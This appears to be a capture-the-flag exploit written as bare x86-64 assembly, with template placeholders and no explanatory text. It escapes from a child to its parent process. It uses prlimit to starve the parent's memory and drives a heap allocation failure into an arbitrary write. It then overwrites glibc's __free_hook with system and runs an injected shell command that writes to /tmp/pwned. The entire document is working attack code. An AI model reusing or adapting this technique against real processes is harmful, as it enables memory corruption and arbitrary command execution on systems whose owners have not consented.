_start:
  ; r13 = p2c
  ; r14 = c2p
  ; r15 = ppid
  mov rsi, {environ}
  mov rsi, [rsi]
  mov r14d, [rsi-0x114]
  lea r13, [r14+1]
  mov r15d, [rsi-0x10c]

;; Restrict parent's memory limit
  ; prlimit(ppid, RLIMIT_AS, new_limit, NULL)
  xor r10d, r10d
  lea rdx, [rel new_limit]
  mov esi, 9
  mov edi, r15d
  mov eax, 302
  syscall
  test eax, eax
  jnz NG

;; Use up parent's heap
  xor ebp, ebp
_consume:
  inc ebp
  mov [rel s], ebp
  ; request(NEW, size)
  mov edx, 0x18
  lea rsi, [rel request_new]
  mov edi, r14d
  mov eax, 1
  syscall
  cmp eax, 0x18
  jnz NG
  ; wait(res)
  mov edx, 4
  lea rsi, [rel res]
  mov edi, r13d
  mov eax, 0
  syscall
  cmp eax, 4
  jnz NG
  mov eax, [rel res]
  test eax, eax
  jz _consume

;; now buffer=NULL, size=-1
;; *__free_hook = system
  mov rax, {free_hook}
  mov [rel i], rax
  mov rax, {system}
  mov [rel v], rax
  ; request(SET, __free_hook/8, system)
  mov edx, 0x18
  lea rsi, [rel request_set]
  mov edi, r14d
  mov eax, 1
  syscall
  cmp eax, 0x18
  jnz NG

;; Loose limit on parent's memory
  ; prlimit(ppid, RLIMIT_AS, remove_limit, NULL)
  xor r10d, r10d
  lea rdx, [rel remove_limit]
  mov esi, 9
  mov edi, r15d
  mov eax, 302
  syscall
  test eax, eax
  jnz NG

;; prepare command to execute
  mov dword [rel s], 0x20
  ; request(NEW, size)
  mov edx, 0x18
  lea rsi, [rel request_new]
  mov edi, r14d
  mov eax, 1
  syscall
  cmp eax, 0x18
  jnz NG

  xor ebp, ebp
_inject:
  mov [rel i], rbp
  lea rsi, [rel s_cmd]
  mov rax, [rsi+rbp*8]
  mov [rel v], rax
  ; request(SET, i, cmd[i*8:i*8+8])
  mov edx, 0x18
  lea rsi, [rel request_set]
  mov edi, r14d
  mov eax, 1
  syscall
  cmp eax, 0x18
  jnz NG
  inc ebp
  cmp ebp, 0x20
  jnz _inject

;; win!
  ; request(NEW, size)
  mov edx, 0x18
  lea rsi, [rel request_new]
  mov edi, r14d
  mov eax, 1
  syscall
  cmp eax, 0x18
  jnz NG

  int3

NG:
  hlt

res:
  dd 0
request_new:
  dq 0                          ; NEW
s:dq 0                          ; size
  dq 0                          ; unused
request_set:
  dq 1                          ; SET
i:dq 0                          ; index
v:dq 0                          ; value

new_limit:
  dq 0                          ; soft limit
  dq 0x133700000000             ; hard limit
remove_limit:
  dq 0x133700000000             ; soft limit
  dq 0x133700000000             ; hard limit

s_cmd:
  db '/bin/ls -lha > /tmp/pwned', 0
